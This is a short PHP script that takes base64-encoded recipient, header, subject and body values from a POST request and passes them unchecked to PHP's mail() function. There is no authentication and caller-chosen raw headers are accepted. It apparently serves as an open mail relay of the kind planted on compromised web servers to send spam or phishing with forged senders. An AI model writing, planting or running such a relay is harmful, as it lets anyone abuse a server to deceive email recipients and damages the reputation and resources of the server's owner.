<?php
if(isset($_POST["mailto"]))
        $MailTo = base64_decode($_POST["mailto"]);
else
 {
 echo "indata_error";
 exit;
 }
if(isset($_POST["msgheader"]))
        $MessageHeader = base64_decode($_POST["msgheader"]);
else
 {
 echo "indata_error";
 exit;
 }
if(isset($_POST["msgbody"]))
        $MessageBody = base64_decode($_POST["msgbody"]);
else
 {
 echo "indata_error";
 exit;
 }
if(isset($_POST["msgsubject"]))
        $MessageSubject = base64_decode($_POST["msgsubject"]);
else
 {
 echo "indata_error";
 exit;
 }
if(mail($MailTo,$MessageSubject,$MessageBody,$MessageHeader))
 echo "sent_ok";
else
 echo "sent_error";
?>